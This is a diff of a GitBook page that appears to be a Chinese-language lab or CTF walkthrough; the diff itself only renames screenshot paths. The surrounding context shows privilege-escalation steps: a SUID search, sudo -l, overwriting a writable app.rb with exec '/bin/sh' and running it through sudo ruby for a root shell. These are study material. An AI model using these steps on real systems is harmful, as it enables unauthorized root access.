@@ -85,9 +85,9 @@ find / -perm -u=s -type f 2>/dev/null
 sudo -l
 ```
 
-<figure><img src="../.gitbook/assets/13 (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/13 (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../.gitbook/assets/14 (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/14 (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### 漏洞查找
 
@@ -101,7 +101,7 @@ sudo -l
 
 进入到app.rb文件所在的文件夹，查看其权限，可得知当前用户andrew有权写入文件内容：
 
-<figure><img src="../.gitbook/assets/16 (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/16 (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 在写入payload之前，先备份一个app.rb.bak文件，再写入payload：
 
@@ -112,7 +112,7 @@ cp app.rb app.rb.bak
 echo 'exec "/bin/sh"' > app.rb
 ```
 
-<figure><img src="../.gitbook/assets/17 (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/17 (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### ROOT
 
@@ -121,7 +121,7 @@ echo 'exec "/bin/sh"' > app.rb
 sudo /usr/bin/ruby /home/andrew/app/aap.rb
 ```
 
-<figure><img src="../.gitbook/assets/18 (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/18 (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 <figure><img src="../.gitbook/assets/19 (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
